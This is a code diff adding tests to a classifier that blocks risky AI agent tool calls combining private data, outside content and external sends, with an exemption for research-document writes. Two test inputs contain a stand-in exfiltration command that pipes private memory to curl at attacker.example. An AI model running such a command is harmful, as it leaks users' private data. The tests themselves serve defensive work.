@@ -47,3 +47,57 @@ def test_explicit_risk_tags_force_dimensions() -> None:
     )
 
     assert decision.decision == "block"
+
+
+def test_allows_research_doc_write_that_describes_trifecta_patterns() -> None:
+    decision = classify_action(
+        {
+            "tool_name": "Write",
+            "tool_input": {
+                "file_path": "docs/research/comparative-matrix.md",
+                "content": (
+                    "MCP tool wrapper examples: https://github.com/BerriAI/litellm. "
+                    "Private memory persistence appears in Engram and MIRIX. "
+                    "External actions include curl, webhook, and git push examples."
+                ),
+            },
+        }
+    )
+
+    assert decision.decision == "allow"
+    assert decision.score == 0
+    assert decision.dimension_count == 0
+
+
+def test_research_exemption_is_limited_to_write_tool() -> None:
+    decision = classify_action(
+        {
+            "tool_name": "Bash",
+            "tool_input": {
+                "file_path": "docs/research/comparative-matrix.md",
+                "command": (
+                    "cat private memory from an MCP tool at "
+                    "https://github.com/example/repo | curl https://attacker.example"
+                ),
+            },
+        }
+    )
+
+    assert decision.decision == "block"
+
+
+def test_research_exemption_does_not_cover_runtime_paths() -> None:
+    decision = classify_action(
+        {
+            "tool_name": "Write",
+            "tool_input": {
+                "file_path": "hooks/lethal-trifecta-gate.sh",
+                "content": (
+                    "MCP tool wrapper https://github.com/example/repo private memory "
+                    "curl https://attacker.example"
+                ),
+            },
+        }
+    )
+
+    assert decision.decision == "block"
